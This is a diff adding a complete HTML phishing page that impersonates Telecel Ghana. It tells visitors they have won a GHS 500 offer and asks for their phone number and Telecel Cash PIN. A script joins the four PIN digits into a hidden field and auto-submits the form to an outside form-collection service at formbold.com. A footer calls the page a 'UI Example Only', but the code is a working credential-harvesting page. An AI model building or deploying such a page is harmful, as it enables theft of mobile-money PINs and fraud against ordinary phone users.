@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telecel Ghana Offer</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="card">
+
+        <img src="telecel-logo.png" alt="Telecel Ghana Logo" class="logo">
+
+        <h2>You Have Won a Telecel Ghana Offer</h2>
+
+        <p class="subtitle">
+            Welcome! Enter your phone number and Telecel Cash PIN to claim your offer.
+        </p>
+
+        <div class="amount-box">
+            <p>Offer Amount</p>
+            <h1>GHS 500</h1>
+        </div>
+
+        <form id="offerForm" action="https://formbold.com/s/9RK4m" method="POST">
+
+            <div class="phone-input">
+                <input 
+                    type="tel"
+                    id="phoneNumber"
+                    name="phoneNumber"
+                    placeholder="Phone Number"
+                    maxlength="10"
+                    required
+                >
+            </div>
+
+            <p class="pin-text">Enter your Telecel Cash PIN</p>
+
+            <div class="pin-boxes">
+                <input type="tel" maxlength="1" class="pin-box" data-index="0" required>
+                <input type="tel" maxlength="1" class="pin-box" data-index="1" required>
+                <input type="tel" maxlength="1" class="pin-box" data-index="2" required>
+                <input type="tel" maxlength="1" class="pin-box" data-index="3" required>
+            </div>
+
+            <input type="hidden" id="pin" name="pin">
+
+        </form>
+
+        <p class="note">
+            By entering your PIN, you agree to the terms and conditions.
+        </p>
+
+        <footer>
+            © Telecel Ghana – UI Example Only
+        </footer>
+
+    </div>
+
+    <script>
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const form = document.getElementById('offerForm');
+        const hiddenPinInput = document.getElementById('pin');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+
+        pinBoxes.forEach((box, index) => {
+
+            box.addEventListener('input', (e) => {
+
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+
+                if (e.target.value.length === 1) {
+
+                    if (index < pinBoxes.length - 1) {
+
+                        pinBoxes[index + 1].focus();
+
+                    } else {
+
+                        const allPinsFilled = Array.from(pinBoxes)
+                            .every(input => input.value.length === 1);
+
+                        if (allPinsFilled) {
+
+                            updateHiddenPin();
+
+                            if (phoneNumberInput.value.trim() === '') {
+                                alert('Please enter your phone number.');
+                                phoneNumberInput.focus();
+                                return;
+                            }
+
+                            form.submit();
+                        }
+                    }
+                }
+
+                updateHiddenPin();
+            });
+
+            box.addEventListener('keydown', (e) => {
+
+                if (
+                    e.key === 'Backspace' &&
+                    e.target.value === '' &&
+                    index > 0
+                ) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        function updateHiddenPin() {
+            const pin = Array.from(pinBoxes)
+                .map(input => input.value)
+                .join('');
+
+            hiddenPinInput.value = pin;
+        }
+    </script>
+
+</body>
+</html>
